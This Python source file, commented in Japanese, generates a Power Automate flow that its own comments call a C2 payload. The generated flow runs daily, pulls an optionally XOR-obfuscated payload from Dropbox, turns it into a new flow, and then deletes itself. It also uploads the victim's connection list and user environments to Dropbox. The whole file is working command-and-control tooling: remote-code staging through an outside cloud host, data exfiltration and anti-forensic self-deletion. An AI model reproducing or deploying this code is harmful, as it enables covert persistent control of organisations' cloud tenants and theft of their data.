import os, random
from enum import Enum

from ..flow import *
from ..triggers import *
from ..actions import *


class DropboxPayload:
    """
    PowerAutomate C2用のPayload生成のインターフェースになるクラス
    PowerAutomate Manager Connectorの接続情報を必要とする。
    """
    def __init__(self,pa_management_connector:str,dropbox_connector:str,encrypt:bool=False,key_length:int=16)->None:
        self.__pa_management_connector:str = pa_management_connector
        self.__dropbox_connector:str = dropbox_connector
        self.host_id = pa_management_connector.replace("shared-flowmanagemen-","")
        self.encrypt = encrypt
        self.key_length = key_length
        self.xor_key = None
        self.root_node:BaseAction = None
        self.connections_file = f"./{self.host_id}/connections.json"

    def update_connections_file(self,path:str):
        self.connections_file = path

    def get_xor_key(self):
        return self.xor_key

    def generate_dropbox_payload(self) -> Flow:
        # Flowインスタンスの作成
        flow = Flow()

        # Connections情報を設定する
        connetions = Connections()
        connections_file = self.connections_file
        if os.path.exists(connections_file):
            connetions.add_connections_from_json_file(connections_file)
        else:
            connetions.add_connection(self.__pa_management_connector) # CreateFlow Actionに必要なコネクタ情報を設定する
            connetions.add_connection(self.__dropbox_connector, "/providers/Microsoft.PowerApps/apis/shared_dropbox") # dropbox

        # Flowの開始処理となるTriggerを設定
        trigger = RecurrenceTrigger("reccurence")
        trigger.set_schedule("Day",1)
        flow.set_trigger(trigger)

        #---------------------------
        # Flowで使う変数を初期化する
        self.root_action = InitVariableAction("InitPayloadStr","payload","string",self.host_id)
        flow.append_action(InitVariableAction("InitPayloadStr","payload","string"))

        if self.encrypt:
            flow.append_action(InitVariableAction("InitPayloadStr2","payload2","array"))

            def read_secret(filename):
                return open(filename, "r").read() if os.path.exists(filename) else ""

            def write_secret(filename, key):
                open(filename, "w").write(key)

            xor_key = read_secret("secret_key.txt")
            if xor_key:
                self.xor_key = xor_key
            else:
                self.xor_key = ",".join([str(random.randint(0, 255)) for _ in range(self.key_length)])
                write_secret("secret_key.txt", self.xor_key)

            flow.append_action(InitVariableAction("bit_array","bit_array","array","@createArray(createArray(0,0,0,0,0,0,0,0),createArray(0,0,0,0,0,0,0,1),createArray(0,0,0,0,0,0,1,0),createArray(0,0,0,0,0,0,1,1),createArray(0,0,0,0,0,1,0,0),createArray(0,0,0,0,0,1,0,1),createArray(0,0,0,0,0,1,1,0),createArray(0,0,0,0,0,1,1,1),createArray(0,0,0,0,1,0,0,0),createArray(0,0,0,0,1,0,0,1),createArray(0,0,0,0,1,0,1,0),createArray(0,0,0,0,1,0,1,1),createArray(0,0,0,0,1,1,0,0),createArray(0,0,0,0,1,1,0,1),createArray(0,0,0,0,1,1,1,0),createArray(0,0,0,0,1,1,1,1),createArray(0,0,0,1,0,0,0,0),createArray(0,0,0,1,0,0,0,1),createArray(0,0,0,1,0,0,1,0),createArray(0,0,0,1,0,0,1,1),createArray(0,0,0,1,0,1,0,0),createArray(0,0,0,1,0,1,0,1),createArray(0,0,0,1,0,1,1,0),createArray(0,0,0,1,0,1,1,1),createArray(0,0,0,1,1,0,0,0),createArray(0,0,0,1,1,0,0,1),createArray(0,0,0,1,1,0,1,0),createArray(0,0,0,1,1,0,1,1),createArray(0,0,0,1,1,1,0,0),createArray(0,0,0,1,1,1,0,1),createArray(0,0,0,1,1,1,1,0),createArray(0,0,0,1,1,1,1,1),createArray(0,0,1,0,0,0,0,0),createArray(0,0,1,0,0,0,0,1),createArray(0,0,1,0,0,0,1,0),createArray(0,0,1,0,0,0,1,1),createArray(0,0,1,0,0,1,0,0),createArray(0,0,1,0,0,1,0,1),createArray(0,0,1,0,0,1,1,0),createArray(0,0,1,0,0,1,1,1),createArray(0,0,1,0,1,0,0,0),createArray(0,0,1,0,1,0,0,1),createArray(0,0,1,0,1,0,1,0),createArray(0,0,1,0,1,0,1,1),createArray(0,0,1,0,1,1,0,0),createArray(0,0,1,0,1,1,0,1),createArray(0,0,1,0,1,1,1,0),createArray(0,0,1,0,1,1,1,1),createArray(0,0,1,1,0,0,0,0),createArray(0,0,1,1,0,0,0,1),createArray(0,0,1,1,0,0,1,0),createArray(0,0,1,1,0,0,1,1),createArray(0,0,1,1,0,1,0,0),createArray(0,0,1,1,0,1,0,1),createArray(0,0,1,1,0,1,1,0),createArray(0,0,1,1,0,1,1,1),createArray(0,0,1,1,1,0,0,0),createArray(0,0,1,1,1,0,0,1),createArray(0,0,1,1,1,0,1,0),createArray(0,0,1,1,1,0,1,1),createArray(0,0,1,1,1,1,0,0),createArray(0,0,1,1,1,1,0,1),createArray(0,0,1,1,1,1,1,0),createArray(0,0,1,1,1,1,1,1),createArray(0,1,0,0,0,0,0,0),createArray(0,1,0,0,0,0,0,1),createArray(0,1,0,0,0,0,1,0),createArray(0,1,0,0,0,0,1,1),createArray(0,1,0,0,0,1,0,0),createArray(0,1,0,0,0,1,0,1),createArray(0,1,0,0,0,1,1,0),createArray(0,1,0,0,0,1,1,1),createArray(0,1,0,0,1,0,0,0),createArray(0,1,0,0,1,0,0,1),createArray(0,1,0,0,1,0,1,0),createArray(0,1,0,0,1,0,1,1),createArray(0,1,0,0,1,1,0,0),createArray(0,1,0,0,1,1,0,1),createArray(0,1,0,0,1,1,1,0),createArray(0,1,0,0,1,1,1,1),createArray(0,1,0,1,0,0,0,0),createArray(0,1,0,1,0,0,0,1),createArray(0,1,0,1,0,0,1,0),createArray(0,1,0,1,0,0,1,1),createArray(0,1,0,1,0,1,0,0),createArray(0,1,0,1,0,1,0,1),createArray(0,1,0,1,0,1,1,0),createArray(0,1,0,1,0,1,1,1),createArray(0,1,0,1,1,0,0,0),createArray(0,1,0,1,1,0,0,1),createArray(0,1,0,1,1,0,1,0),createArray(0,1,0,1,1,0,1,1),createArray(0,1,0,1,1,1,0,0),createArray(0,1,0,1,1,1,0,1),createArray(0,1,0,1,1,1,1,0),createArray(0,1,0,1,1,1,1,1),createArray(0,1,1,0,0,0,0,0),createArray(0,1,1,0,0,0,0,1),createArray(0,1,1,0,0,0,1,0),createArray(0,1,1,0,0,0,1,1),createArray(0,1,1,0,0,1,0,0),createArray(0,1,1,0,0,1,0,1),createArray(0,1,1,0,0,1,1,0),createArray(0,1,1,0,0,1,1,1),createArray(0,1,1,0,1,0,0,0),createArray(0,1,1,0,1,0,0,1),createArray(0,1,1,0,1,0,1,0),createArray(0,1,1,0,1,0,1,1),createArray(0,1,1,0,1,1,0,0),createArray(0,1,1,0,1,1,0,1),createArray(0,1,1,0,1,1,1,0),createArray(0,1,1,0,1,1,1,1),createArray(0,1,1,1,0,0,0,0),createArray(0,1,1,1,0,0,0,1),createArray(0,1,1,1,0,0,1,0),createArray(0,1,1,1,0,0,1,1),createArray(0,1,1,1,0,1,0,0),createArray(0,1,1,1,0,1,0,1),createArray(0,1,1,1,0,1,1,0),createArray(0,1,1,1,0,1,1,1),createArray(0,1,1,1,1,0,0,0),createArray(0,1,1,1,1,0,0,1),createArray(0,1,1,1,1,0,1,0),createArray(0,1,1,1,1,0,1,1),createArray(0,1,1,1,1,1,0,0),createArray(0,1,1,1,1,1,0,1),createArray(0,1,1,1,1,1,1,0),createArray(0,1,1,1,1,1,1,1),createArray(1,0,0,0,0,0,0,0),createArray(1,0,0,0,0,0,0,1),createArray(1,0,0,0,0,0,1,0),createArray(1,0,0,0,0,0,1,1),createArray(1,0,0,0,0,1,0,0),createArray(1,0,0,0,0,1,0,1),createArray(1,0,0,0,0,1,1,0),createArray(1,0,0,0,0,1,1,1),createArray(1,0,0,0,1,0,0,0),createArray(1,0,0,0,1,0,0,1),createArray(1,0,0,0,1,0,1,0),createArray(1,0,0,0,1,0,1,1),createArray(1,0,0,0,1,1,0,0),createArray(1,0,0,0,1,1,0,1),createArray(1,0,0,0,1,1,1,0),createArray(1,0,0,0,1,1,1,1),createArray(1,0,0,1,0,0,0,0),createArray(1,0,0,1,0,0,0,1),createArray(1,0,0,1,0,0,1,0),createArray(1,0,0,1,0,0,1,1),createArray(1,0,0,1,0,1,0,0),createArray(1,0,0,1,0,1,0,1),createArray(1,0,0,1,0,1,1,0),createArray(1,0,0,1,0,1,1,1),createArray(1,0,0,1,1,0,0,0),createArray(1,0,0,1,1,0,0,1),createArray(1,0,0,1,1,0,1,0),createArray(1,0,0,1,1,0,1,1),createArray(1,0,0,1,1,1,0,0),createArray(1,0,0,1,1,1,0,1),createArray(1,0,0,1,1,1,1,0),createArray(1,0,0,1,1,1,1,1),createArray(1,0,1,0,0,0,0,0),createArray(1,0,1,0,0,0,0,1),createArray(1,0,1,0,0,0,1,0),createArray(1,0,1,0,0,0,1,1),createArray(1,0,1,0,0,1,0,0),createArray(1,0,1,0,0,1,0,1),createArray(1,0,1,0,0,1,1,0),createArray(1,0,1,0,0,1,1,1),createArray(1,0,1,0,1,0,0,0),createArray(1,0,1,0,1,0,0,1),createArray(1,0,1,0,1,0,1,0),createArray(1,0,1,0,1,0,1,1),createArray(1,0,1,0,1,1,0,0),createArray(1,0,1,0,1,1,0,1),createArray(1,0,1,0,1,1,1,0),createArray(1,0,1,0,1,1,1,1),createArray(1,0,1,1,0,0,0,0),createArray(1,0,1,1,0,0,0,1),createArray(1,0,1,1,0,0,1,0),createArray(1,0,1,1,0,0,1,1),createArray(1,0,1,1,0,1,0,0),createArray(1,0,1,1,0,1,0,1),createArray(1,0,1,1,0,1,1,0),createArray(1,0,1,1,0,1,1,1),createArray(1,0,1,1,1,0,0,0),createArray(1,0,1,1,1,0,0,1),createArray(1,0,1,1,1,0,1,0),createArray(1,0,1,1,1,0,1,1),createArray(1,0,1,1,1,1,0,0),createArray(1,0,1,1,1,1,0,1),createArray(1,0,1,1,1,1,1,0),createArray(1,0,1,1,1,1,1,1),createArray(1,1,0,0,0,0,0,0),createArray(1,1,0,0,0,0,0,1),createArray(1,1,0,0,0,0,1,0),createArray(1,1,0,0,0,0,1,1),createArray(1,1,0,0,0,1,0,0),createArray(1,1,0,0,0,1,0,1),createArray(1,1,0,0,0,1,1,0),createArray(1,1,0,0,0,1,1,1),createArray(1,1,0,0,1,0,0,0),createArray(1,1,0,0,1,0,0,1),createArray(1,1,0,0,1,0,1,0),createArray(1,1,0,0,1,0,1,1),createArray(1,1,0,0,1,1,0,0),createArray(1,1,0,0,1,1,0,1),createArray(1,1,0,0,1,1,1,0),createArray(1,1,0,0,1,1,1,1),createArray(1,1,0,1,0,0,0,0),createArray(1,1,0,1,0,0,0,1),createArray(1,1,0,1,0,0,1,0),createArray(1,1,0,1,0,0,1,1),createArray(1,1,0,1,0,1,0,0),createArray(1,1,0,1,0,1,0,1),createArray(1,1,0,1,0,1,1,0),createArray(1,1,0,1,0,1,1,1),createArray(1,1,0,1,1,0,0,0),createArray(1,1,0,1,1,0,0,1),createArray(1,1,0,1,1,0,1,0),createArray(1,1,0,1,1,0,1,1),createArray(1,1,0,1,1,1,0,0),createArray(1,1,0,1,1,1,0,1),createArray(1,1,0,1,1,1,1,0),createArray(1,1,0,1,1,1,1,1),createArray(1,1,1,0,0,0,0,0),createArray(1,1,1,0,0,0,0,1),createArray(1,1,1,0,0,0,1,0),createArray(1,1,1,0,0,0,1,1),createArray(1,1,1,0,0,1,0,0),createArray(1,1,1,0,0,1,0,1),createArray(1,1,1,0,0,1,1,0),createArray(1,1,1,0,0,1,1,1),createArray(1,1,1,0,1,0,0,0),createArray(1,1,1,0,1,0,0,1),createArray(1,1,1,0,1,0,1,0),createArray(1,1,1,0,1,0,1,1),createArray(1,1,1,0,1,1,0,0),createArray(1,1,1,0,1,1,0,1),createArray(1,1,1,0,1,1,1,0),createArray(1,1,1,0,1,1,1,1),createArray(1,1,1,1,0,0,0,0),createArray(1,1,1,1,0,0,0,1),createArray(1,1,1,1,0,0,1,0),createArray(1,1,1,1,0,0,1,1),createArray(1,1,1,1,0,1,0,0),createArray(1,1,1,1,0,1,0,1),createArray(1,1,1,1,0,1,1,0),createArray(1,1,1,1,0,1,1,1),createArray(1,1,1,1,1,0,0,0),createArray(1,1,1,1,1,0,0,1),createArray(1,1,1,1,1,0,1,0),createArray(1,1,1,1,1,0,1,1),createArray(1,1,1,1,1,1,0,0),createArray(1,1,1,1,1,1,0,1),createArray(1,1,1,1,1,1,1,0),createArray(1,1,1,1,1,1,1,1))"))
            flow.append_action(InitVariableAction("chr_array","chr_array","array","@createArray('*','*','*','*','*','*','*','*','*','\t','','\x0b','\x0c','','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','','!','\"','#','$','%','&','''','(',')','*','+',',','-','.','/','0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?','@','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','[','\\',']','^','_','`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','{','|','}','~','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*','*')"))
            flow.append_action(InitVariableAction("K","K","array",f"@createArray({self.xor_key})"))

        # ScopeにまとめるActionsを定義する
        actions = Actions()
        actions.append(AddToTimeAction("AddToTime_01","Minute",1))
        dropbox_getpayload = DropboxGetFileContentAction("GetPayload","payload")
        actions.append(dropbox_getpayload)
        actions.append(SetVariableAction("set 'payload'","payload","@{body('GetPayload')}"))

        if self.encrypt:
            actions.append(SetVariableAction("convert payload to array","payload2","@split(variables('payload'),',')"))
            actions.append(SelectAction("xor","@range(0,length(variables('payload2')))","@variables('chr_array')[div(sub(indexOf(concat(variables('bit_array')),concat(createArray(int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][0]),bool(variables('bit_array')[int(variables('payload2')[item()])][0])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][0])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][0])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][1]),bool(variables('bit_array')[int(variables('payload2')[item()])][1])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][1])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][1])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][2]),bool(variables('bit_array')[int(variables('payload2')[item()])][2])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][2])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][2])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][3]),bool(variables('bit_array')[int(variables('payload2')[item()])][3])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][3])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][3])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][4]),bool(variables('bit_array')[int(variables('payload2')[item()])][4])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][4])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][4])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][5]),bool(variables('bit_array')[int(variables('payload2')[item()])][5])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][5])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][5])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][6]),bool(variables('bit_array')[int(variables('payload2')[item()])][6])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][6])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][6])))))),int(not(or(and(bool(variables('bit_array')[variables('K')[mod(item(),16)]][7]),bool(variables('bit_array')[int(variables('payload2')[item()])][7])),and(not(bool(variables('bit_array')[variables('K')[mod(item(),16)]][7])),not(bool(variables('bit_array')[int(variables('payload2')[item()])][7]))))))))),1),18)]"))
            actions.append(SetVariableAction("convert payload to string","payload","@join(body('xor'),'')"))

        actions.append(WaitAction("wait01",1,"Minute"))
        create_flow = CreateFlowAction("CreateFlow01")
        create_flow.set_parameters("@utcNow()","payload", connetions)
        actions.append(create_flow)

        actions.append(WaitAction("wait02",1,"Minute"))

        # ScopeとしてまとめたActionをFlowに追加する
        flow.append_action(ScopeStatement("payload_scope",actions))
        # Scopeのあとに自フローを削除するActionを追加する
        flow.append_action(DeleteFlowAction("DeleteFlow01"),True)

        #---------------------------
        # コネクタ一覧情報を更新するActionsを定義する
        actions = Actions()
        actions.append(ListConnectionsAction("ListConnection"))
        dropbox_upload = DropboxUpdateFileAction("upload_connection","connections","@body('ListConnection')")
        actions.append(dropbox_upload)

        # ScopeとしてまとめたActionをFlowに追加する
        flow.add_top_action(ScopeStatement("connection_check",actions))

        #---------------------------
        # コネクタ一覧情報を更新するActionsを定義する
        actions = Actions()
        actions.append(ListUserEnvironmentsAction("ListUserEnvironments"))
        dropbox_upload = DropboxUpdateFileAction("upload_environments","environments","@body('ListUserEnvironments')")
        actions.append(dropbox_upload)

        # ScopeとしてまとめたActionをFlowに追加する
        flow.add_top_action(ScopeStatement("environments_check",actions))

        #actions = Actions()
        #actions.append(SelectAction("select", "@range(0, 255)", "@item()"))
        #flow.add_top_action(ScopeStatement("testscope", actions))

        return flow
